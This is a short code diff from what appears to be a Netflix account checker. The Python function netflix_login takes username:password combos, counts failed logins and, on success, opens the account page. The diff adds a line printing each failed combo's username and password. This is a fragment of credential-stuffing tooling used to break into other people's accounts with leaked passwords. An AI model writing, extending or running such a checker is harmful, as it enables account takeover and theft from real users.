@@ -342,6 +342,7 @@ def netflix_login(combos):
             or "Incorrect password" in request.text
         ):
             bad += 1
+            print(combo.split(":")[0], combo.split(":")[1])
         else:
             info = client.get(
                 "https://www.netflix.com/YourAccount",
